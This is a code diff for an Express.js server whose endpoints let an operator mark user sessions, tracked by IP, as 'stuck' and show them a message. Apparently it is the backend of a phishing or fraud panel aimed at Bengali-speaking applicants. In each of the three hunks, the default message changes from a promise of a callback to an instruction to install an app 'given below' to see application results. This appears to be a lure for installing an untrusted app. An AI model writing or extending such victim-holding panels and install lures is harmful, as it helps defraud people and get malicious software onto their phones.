@@ -321,7 +321,7 @@ app.post('/api/stuck-session', (req, res) => {
     return res.status(404).json({ error: 'Session not found', sessionId });
   }
   
-  const stuckMsg = req.body?.message || req.query?.message || 'আপনার আবেদন গৃহীত হয়েছে। অতি শীঘ্রই আমাদের প্রতিনিধি আপনাকে ফোন করবে।';
+  const stuckMsg = req.body?.message || req.query?.message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
   const customerIp = session.clientIp || '';
   
   // Update session
@@ -369,7 +369,7 @@ app.get('/api/stuck-session', (req, res) => {
     return res.status(404).json({ error: 'Session not found', sessionId });
   }
   
-  const stuckMsg = req.query?.message || 'আপনার আবেদন গৃহীত হয়েছে। অতি শীঘ্রই আমাদের প্রতিনিধি আপনাকে ফোন করবে।';
+  const stuckMsg = req.query?.message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
   const customerIp = session.clientIp || '';
   
   sessions[sessionId] = {
@@ -440,7 +440,7 @@ app.get('/api/check-stuck', (req, res) => {
   
   // Fallback: IP stuck entry message
   if (!stuckMessage && ipStuck) {
-    stuckMessage = ipStuck.message || 'আপনার আবেদন গৃহীত হয়েছে। অতি শীঘ্রই আমাদের প্রতিনিধি আপনাকে ফোন করবে।';
+    stuckMessage = ipStuck.message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';
   }
   
   const isStuck = !!ipStuck || sessionStuck;
